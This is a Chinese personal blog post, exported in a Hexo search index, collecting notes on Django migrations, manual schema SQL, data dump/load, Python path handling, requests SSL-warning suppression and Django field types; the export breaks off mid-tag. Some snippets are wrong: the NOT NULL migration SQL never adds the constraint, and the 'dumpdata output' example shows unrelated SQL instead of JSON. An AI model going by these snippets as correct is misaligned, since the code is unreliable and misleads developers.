<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>毕设-Django—Python一些记录</title>
    <link href="/2022/05/08/%E6%AF%95%E8%AE%BE-Django%E2%80%94Python%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/05/08/%E6%AF%95%E8%AE%BE-Django%E2%80%94Python%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p><em>用来记一下毕设用到的坑，说不定以后用到的时候方便查查</em></p><h1 id="django模型修改及数据迁移"><a class="markdownIt-Anchor" href="#django模型修改及数据迁移"></a> Django模型修改及数据迁移</h1><h3 id="migrations"><a class="markdownIt-Anchor" href="#migrations"></a> Migrations</h3><p>Django中对Model进行修改是件麻烦的事情，syncdb命令仅仅创建数据库里还没有的表，它并不对已存在的数据表进行同步修改,也不处理数据模型的删除。 如果你新增或修改数据模型里的字段,或是删除了一个数据模型，你需要手动在数据库里进行相应的修改或者使用South。Django 1.7中已经集成了South的代码，提供了3个新命令：</p><ul><li>migrate: 用于执行迁移动作，具有syncdb的功能</li><li>makemigrations: 基于当前的model创建新的迁移策略文件</li><li>sqlmigrate: 显示迁移的SQL语句，具有sqlall的功能</li></ul><p>使用起来很简单，对Model做了修改后，使用makemigrations记录修改：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ <span class="hljs-keyword">python</span> manage.<span class="hljs-keyword">py</span> makemigrations<br>Migrations <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;books&#x27;</span>:<br><span class="hljs-number">0003</span>_auto.<span class="hljs-keyword">py</span>:<br>    - Alter field author <span class="hljs-keyword">on</span> book<br></code></pre></td></tr></table></figure><p>你的Model会被扫描, 然后与migrations文件夹中以前的版本作比较, 然后生成本次迁移文件。</p><p>有了新的migration文件，就可以使用migrate修改数据库模式：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ <span class="hljs-keyword">python</span> manage.<span class="hljs-keyword">py</span> migrate<br>Operations <span class="hljs-keyword">to</span> perform:<br>  Synchronize unmigrated app<span class="hljs-variable">s:</span> sessions, admin, <span class="hljs-keyword">messages</span>, auth, staticfiles, contenttypes<br>  Apply <span class="hljs-keyword">all</span> migration<span class="hljs-variable">s:</span> books<br>Synchronizing apps without migration<span class="hljs-variable">s:</span><br>  Creating tables...<br>  Installing custom SQL...<br>  Installing indexes...<br>Installed <span class="hljs-number">0</span> object(s) from <span class="hljs-number">0</span> fixture(s)<br>Running migration<span class="hljs-variable">s:</span><br>  Applying books.<span class="hljs-number">0003</span>_auto... OK<br></code></pre></td></tr></table></figure><p>也可以针对单独的app生成migration：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ <span class="hljs-keyword">python</span> manage.<span class="hljs-keyword">py</span> makemigrations your_app_label<br></code></pre></td></tr></table></figure><p>也可以对数据库中的数据进行修改，首先建立一个空的migration文件：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">python</span> manage.py makemigrations <span class="hljs-string">``</span>-<span class="hljs-string">``</span>-<span class="hljs-string">``</span>empty yourappname<br>migrations<br></code></pre></td></tr></table></figure><p>文件的内容如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-meta"># -*- coding: utf-8 -*-</span><br><span class="hljs-title">from</span> django.db <span class="hljs-keyword">import</span> models, migrations<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">Migration</span>(<span class="hljs-title">migrations</span>.<span class="hljs-type">Migration</span>):</span><br><span class="hljs-class"> </span><br><span class="hljs-class">    dependencies = [</span><br><span class="hljs-class">        (&#x27;<span class="hljs-title">yourappname&#x27;</span>, &#x27;0001<span class="hljs-title">_initial&#x27;</span>),</span><br><span class="hljs-class">    ]</span><br><span class="hljs-class"> </span><br><span class="hljs-class">    operations = [</span><br><span class="hljs-class">    ]</span><br></code></pre></td></tr></table></figure><p>如果想修改某个Model例如Person的数据，设置其name字段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> models, migrations<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">combine_names</span>(<span class="hljs-params">apps, schema_editor</span>):</span><br>    <span class="hljs-comment"># We can&#x27;t import the Person model directly as it may be a newer</span><br>    <span class="hljs-comment"># version than this migration expects. We use the historical version.</span><br>    Person = apps.get_model(<span class="hljs-string">&quot;yourappname&quot;</span>, <span class="hljs-string">&quot;Person&quot;</span>)<br>    <span class="hljs-keyword">for</span> person <span class="hljs-keyword">in</span> Person.objects.<span class="hljs-built_in">all</span>():<br>        person.name = <span class="hljs-string">&quot;%s %s&quot;</span> % (person.first_name, person.last_name)<br>        person.save()<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Migration</span>(<span class="hljs-params">migrations.Migration</span>):</span><br> <br>    dependencies = [<br>        (<span class="hljs-string">&#x27;yourappname&#x27;</span>, <span class="hljs-string">&#x27;0001_initial&#x27;</span>),<br>    ]<br> <br>    operations = [<br>        migrations.RunPython(combine_names),<br>    ]<br></code></pre></td></tr></table></figure><p>最后运行 python <a href="http://manage.py">manage.py</a> migrate即可。这样Person中的所有对象的name字段都设置好了。</p><p>依据Model修改关系数据库是开发中的一个重要的问题，解决这个问题可以提升开发速度，不过要在生产环境中随便使用migrate操作数据库还是很危险的，有时候需要手动修改数据库。</p><h3 id="手动修改数据库"><a class="markdownIt-Anchor" href="#手动修改数据库"></a> 手动修改数据库</h3><p>当处理模型修改的时候：</p><ul><li><p>如果模型包含一个未曾在数据库里建立的字段，Django会报出错信息。 当你第一次用Django的数据库API请求表中不存在的字段时会导致错误。</p></li><li><p>Django不关心数据库表中是否存在未在模型中定义的列。</p></li><li><p>Django不关心数据库中是否存在未被模型表示的table。</p></li></ul><p><strong>添加字段</strong></p><ol><li><p>在你的模型里添加字段。下例向Book模型添加num_pages字段：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">Book</span>(<span class="hljs-title">models</span>.<span class="hljs-type">Model</span>):</span><br><span class="hljs-class">    title = models.<span class="hljs-type">CharField</span>(<span class="hljs-title">max_length</span>=100)</span><br><span class="hljs-class">    authors = models.<span class="hljs-type">ManyToManyField</span>(<span class="hljs-type">Author</span>)</span><br><span class="hljs-class">    publisher = models.<span class="hljs-type">ForeignKey</span>(<span class="hljs-type">Publisher</span>)</span><br><span class="hljs-class">    publication_date = models.<span class="hljs-type">DateField</span>()</span><br><span class="hljs-class">    **num_pages = models.<span class="hljs-type">IntegerField</span>(<span class="hljs-title">blank</span>=<span class="hljs-type">True</span>, <span class="hljs-title">null</span>=<span class="hljs-type">True</span>)**</span><br><span class="hljs-class"> </span><br><span class="hljs-class">    def __unicode__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">        return self.title　</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure></li><li><p><a href="http://xn--manage-2w2r549b.py">运行manage.py</a> sqlall yourappname来测试模型新的CREATE TABLE语句。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> &quot;books_book&quot; (<br>    &quot;id&quot; serial <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">PRIMARY</span> KEY,<br>    &quot;title&quot; <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    &quot;publisher_id&quot; <span class="hljs-type">integer</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">REFERENCES</span> &quot;books_publisher&quot; (&quot;id&quot;),<br>    &quot;publication_date&quot; <span class="hljs-type">date</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    &quot;num_pages&quot; <span class="hljs-type">integer</span> <span class="hljs-keyword">NULL</span><br>);<br></code></pre></td></tr></table></figure></li><li><p>开启你的数据库的交互命令界面(比如,psql或者mysql，<a href="http://xn--manage-2x8i64bc2weu9ap37bni1a.py">或者可以使用manage.py</a> dbshell。 执行ALTER TABLE语句来添加新列。</p><p><code>ALTER TABLE books_book ADD COLUMN num_pages integer;</code></p></li></ol><p><strong>添加 非NULL 字段</strong></p><p>先创建 NULL 型的字段，然后将该字段的值填充为某个默认值，然后再将该字段改为 NOT NULL 型</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">BEGIN</span>;<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> books_book <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">COLUMN</span> num_pages <span class="hljs-type">integer</span>;<br><span class="hljs-keyword">UPDATE</span> books_book <span class="hljs-keyword">SET</span> num_pages=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">UPDATE</span> books_book <span class="hljs-keyword">SET</span> num_pages = <span class="hljs-keyword">NULL</span>;<br><span class="hljs-keyword">COMMIT</span>;<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-operator">&lt;</span>YourTable<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">ADD</span> <span class="hljs-operator">&lt;</span>NewColumn<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>NewColumnType<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-operator">&lt;</span>DefaultValue<span class="hljs-operator">&gt;</span>;<br></code></pre></td></tr></table></figure><p><strong>添加ForeignKey或ManyToManyField</strong></p><p>添加外键即是添加key_id的integer字段，添加多对多字段是创建一个新的数据表。</p><p><strong>删除字段</strong></p><p>比较简单，将表中的某列删掉即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> books_book <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">COLUMN</span> num_pages;<br></code></pre></td></tr></table></figure><p>使用sqlite3时，会有些麻烦，sqlite3不支持删除列操作，只有有限地 ALTER TABLE 支持。你可以使用它来在表的末尾增加一列，可更改表的名称。 如果需要对表结构做更复杂的改变，则必须重新建表。重建时可以先将已存在的数据放到一个临时表中，删除原表， 创建新表，然后将数据从临时表中复制回来。</p><p>如，假设有一个 t1 表，其中有 “a”, “b”, “c” 三列， 如果要删除列 c ：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">BEGIN</span> TRANSACTION;<br><span class="hljs-keyword">CREATE</span> TEMPORARY <span class="hljs-keyword">TABLE</span> t1_backup(a,b);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> t1_backup <span class="hljs-keyword">SELECT</span> a,b <span class="hljs-keyword">FROM</span> t1;<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> t1;<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> t1(a,b);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> t1 <span class="hljs-keyword">SELECT</span> a,b <span class="hljs-keyword">FROM</span> t1_backup;<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> t1_backup;<br><span class="hljs-keyword">COMMIT</span>;<br></code></pre></td></tr></table></figure><p><strong>删除多对多关联字段</strong></p><p>删掉多对多关联的数据表即可</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> books_book_authors;<br></code></pre></td></tr></table></figure><p><strong>删除模型</strong></p><p>删除数据表即可</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> books_book;<br></code></pre></td></tr></table></figure><h3 id="数据迁移"><a class="markdownIt-Anchor" href="#数据迁移"></a> 数据迁移</h3><p>django 项目提供了一个导出的方法 python <a href="http://manage.py">manage.py</a> dumpdata, 不指定 appname 时默认为导出所有的app</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> manage.<span class="hljs-keyword">py</span> dumpdata myapp &gt; myapp.json<br></code></pre></td></tr></table></figure><p>导出的文件内容格式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">BEGIN</span> TRANSACTION;<br><span class="hljs-keyword">CREATE</span> TEMPORARY <span class="hljs-keyword">TABLE</span> t1_backup(a,b);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> t1_backup <span class="hljs-keyword">SELECT</span> a,b <span class="hljs-keyword">FROM</span> t1;<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> t1;<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> t1(a,b);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> t1 <span class="hljs-keyword">SELECT</span> a,b <span class="hljs-keyword">FROM</span> t1_backup;<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> t1_backup;<br><span class="hljs-keyword">COMMIT</span>;<br></code></pre></td></tr></table></figure><p>数据导入：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> manage.<span class="hljs-keyword">py</span> loaddata myapp.json<br></code></pre></td></tr></table></figure><p>导出用户数据：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> manage.<span class="hljs-keyword">py</span> dumpdata auth &gt; auth.json<br></code></pre></td></tr></table></figure><p>来源：<a href="https://www.cnblogs.com/linxiyue/p/4106514.html">https://www.cnblogs.com/linxiyue/p/4106514.html</a></p><h1 id="python-获取当前路径"><a class="markdownIt-Anchor" href="#python-获取当前路径"></a> python 获取当前路径</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys,os   <span class="hljs-comment"># sys 对解释器操作（命令）的内置模块   # os 对操作系统操作（命令）的内置模块</span><br><span class="hljs-comment"># __file__ 为当前脚本, 形如 xxx.py</span><br><span class="hljs-comment"># os.path.abspath(__file__) 获取当前脚本的绝对路径（相对于执行该脚本的终端）</span><br><span class="hljs-comment"># os.path.dirname() 获取上级目录</span><br><span class="hljs-comment"># 下面嵌套了两次，即得到 父目录 的 父目录 ；同理可根据自己的需求来获取相应的目录</span><br>BASE_DIR = os.path.dirname(os.path.abspath(__file__))<br><span class="hljs-comment"># 将BASE_DIR路径添加到解释器的搜索路径列表中</span><br>sys.path.append(BASE_DIR)<br></code></pre></td></tr></table></figure><h1 id="request包消除ssl验证强制ipv4"><a class="markdownIt-Anchor" href="#request包消除ssl验证强制ipv4"></a> request包消除ssl验证，强制ipv4</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">requests<span class="hljs-selector-class">.packages</span><span class="hljs-selector-class">.urllib3</span><span class="hljs-selector-class">.disable_warnings</span>(InsecureRequestWarning)<br>requests<span class="hljs-selector-class">.packages</span><span class="hljs-selector-class">.urllib3</span><span class="hljs-selector-class">.disable_warnings</span>(InsecurePlatformWarning)<br>requests<span class="hljs-selector-class">.packages</span><span class="hljs-selector-class">.urllib3</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.connection</span><span class="hljs-selector-class">.HAS_IPV6</span> = False<br></code></pre></td></tr></table></figure><h1 id="windows获取当前路径"><a class="markdownIt-Anchor" href="#windows获取当前路径"></a> windows获取当前路径</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys,os   <span class="hljs-comment"># sys 对解释器操作（命令）的内置模块   # os 对操作系统操作（命令）的内置模块</span><br><span class="hljs-comment"># __file__ 为当前脚本, 形如 xxx.py</span><br><span class="hljs-comment"># os.path.abspath(__file__) 获取当前脚本的绝对路径（相对于执行该脚本的终端）</span><br><span class="hljs-comment"># os.path.dirname() 获取上级目录</span><br><span class="hljs-comment"># 下面嵌套了两次，即得到 父目录 的 父目录 ；同理可根据自己的需求来获取相应的目录</span><br>BASE_DIR = os.path.dirname(os.path.abspath(__file__))<br><span class="hljs-comment"># 将BASE_DIR路径添加到解释器的搜索路径列表中</span><br>sys.path.append(BASE_DIR)<br></code></pre></td></tr></table></figure><h1 id="django模型类型"><a class="markdownIt-Anchor" href="#django模型类型"></a> django模型类型</h1><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-number">1</span>、models.AutoField<br><br>自增列 = <span class="hljs-built_in">int</span>(<span class="hljs-number">11</span>)<br>如果没有的话，默认会生成一个名称为 id 的列<br>如果要显式的自定义一个自增列，必须设置primary_key=True。<br><span class="hljs-number">2</span>、models.CharField<br><br>字符串字段<br>必须设置max_length参数<br><span class="hljs-number">3</span>、models.BooleanField<br><br>布尔类型=tinyint(<span class="hljs-number">1</span>)<br>不能为空，可添加Blank=True<br><span class="hljs-number">4</span>、models.ComaSeparatedIntegerField<br><br>用逗号分割的数字=varchar<br>继承CharField，所以必须 max_lenght 参数<br><span class="hljs-number">5</span>、models.DateField<br><br>日期类型 date<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DateField</span>.</span></span>auto_now：保存时自动设置该字段为现在日期，最后修改日期<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DateField</span>.</span></span>auto_now_add：当该对象第一次被创建是自动设置该字段为现在日期，创建日期。<br><span class="hljs-number">6</span>、models.DateTimeField<br><br>日期时间类型 datetime<br>同DateField的参数<br><span class="hljs-number">7</span>、models.Decimal<br><br>十进制小数类型 = decimal<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DecimalField</span>.</span></span>max_digits：数字中允许的最大位数<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DecimalField</span>.</span></span>decimal_places：存储的十进制位数<br><span class="hljs-number">8</span>、models.EmailField<br><br>一个带有检查 Email 合法性的 CharField<br><span class="hljs-number">9</span>、models.FloatField<br><br>浮点类型 = double<br><span class="hljs-number">10</span>、models.IntegerField<br><br>整形<br><span class="hljs-number">11</span>、models.BigIntegerField<br><br>长整形<br>integer_field_ranges = &#123;<br>&#x27;SmallIntegerField&#x27;: (-<span class="hljs-number">32768</span>, <span class="hljs-number">32767</span>),<br><br>&#x27;IntegerField&#x27;: (-<span class="hljs-number">2147483648</span>, <span class="hljs-number">2147483647</span>),<br><br>&#x27;BigIntegerField&#x27;: (-<span class="hljs-number">9223372036854775808</span>, <span class="hljs-number">9223372036854775807</span>),<br><br>&#x27;PositiveSmallIntegerField&#x27;: (<span class="hljs-number">0</span>, <span class="hljs-number">32767</span>),<br><br>&#x27;PositiveIntegerField&#x27;: (<span class="hljs-number">0</span>, <span class="hljs-number">2147483647</span>),<br><br>&#125;<br><br><span class="hljs-number">12</span>、models.GenericIPAddressField<br><br>一个带有检查 IP地址合法性的 CharField<br><span class="hljs-number">13</span>、models.NullBooleanField<br><br>允许为空的布尔类型<br><span class="hljs-number">14</span>、models.PositiveIntegerFiel<br><br>正整数<br><span class="hljs-number">15</span>、models.PositiveSmallIntegerField<br><br>正smallInteger<br><span class="hljs-number">16</span>、models.SlugField<br><br>减号、下划线、字母、数字<br><span class="hljs-number">17</span>、models.SmallIntegerField<br><br>数字<br>数据库中的字段有：tinyint、smallint、<span class="hljs-built_in">int</span>、bigint<br><span class="hljs-number">18</span>、models.TextField<br><br>大文本。默认对应的form标签是textarea。<br><span class="hljs-number">19</span>、models.TimeField<br><br>时间 HH:MM<span class="hljs-literal">[:<span class="hljs-identifier">ss</span>[.<span class="hljs-identifier">uuuuuu</span>]</span>]<br><span class="hljs-number">20</span>、models.URLField<br><br>一个带有URL合法性校验的CharField。<br><span class="hljs-number">21</span>、models.BinaryField<br><br>二进制<br>存储二进制数据。不能使用filter函数获得QuerySet。<br><span class="hljs-number">22</span>、models.ImageField<br><br>图片<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ImageField</span>.</span></span>height_field、<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ImageField</span>.</span></span>width_field：如果提供这两个参数，则图片将按提供的高度和宽度规格保存。<br>该字段要求 Python Imaging 库Pillow。<br>会检查上传的对象是否是一个合法图片。<br><span class="hljs-number">23</span>、models.<span class="hljs-constructor">FileField(<span class="hljs-params">upload_to</span>=None[, <span class="hljs-params">max_length</span>=100, <span class="hljs-operator">**</span> <span class="hljs-params">options</span>])</span><br><br>文件<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">FileField</span>.</span></span>upload_to：一个用于保存上传文件的本地文件系统路径，该路径由 MEDIA_ROOT 中设置<br>这个字段不能设置primary_key和unique选项.在数据库中存储类型是varchar，默认最大长度为<span class="hljs-number">100</span><br><span class="hljs-number">24</span>、models.<span class="hljs-constructor">FilePathField(<span class="hljs-params">path</span>=None[, <span class="hljs-params">math</span>=None, <span class="hljs-params">recursive</span>=False, <span class="hljs-params">max_length</span>=100, <span class="hljs-operator">**</span><span class="hljs-params">options</span>])</span><br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">FilePathField</span>.</span></span>path：文件的绝对路径，必填<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">FilePathField</span>.</span></span><span class="hljs-keyword">match</span>：用于过滤路径下文件名的正则表达式，该表达式将用在文件名上（不包括路径）。<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">FilePathField</span>.</span></span>recursive：True 或 False，默认为 False，指定是否应包括所有子目录的路径。<br><br>例如：<span class="hljs-constructor">FilePathField(<span class="hljs-params">path</span>=<span class="hljs-string">&quot;/home/images&quot;</span>, <span class="hljs-params">match</span>=<span class="hljs-string">&quot;foo.*&quot;</span>, <span class="hljs-params">recursive</span>=True)</span><br><br></code></pre></td></tr></table></figure><p>链接：<a href="https://www.jianshu.com/p/a7dba55a62b5">https://www.jianshu.com/p/a7dba55a62b5</a></p><h1 id="django模板切片循环"><a class="markdownIt-Anchor" href="#django模板切片循环"></a> django模板切片,循环</h1><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> p_var <span class="hljs-keyword">in</span> ipinfotest1.port_set.all|<span class="hljs-name">slice</span>:<span class="hljs-string">&quot;3&quot;</span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="html隐藏表单"><a class="markdownIt-Anchor" href="#html隐藏表单"></a> html隐藏表单</h1><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;search&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">search</span> &#125;&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h1 id="python-redis"><a class="markdownIt-Anchor" href="#python-redis"></a> python  redis</h1><p><a href="https://blog.csdn.net/csdnhxs/article/details/122450575">(11条消息) Python操作Redis详解_csdnhxs的博客-CSDN博客_python redis</a></p><p><strong>lrem函数改动</strong>，直接看源码吧</p><figure 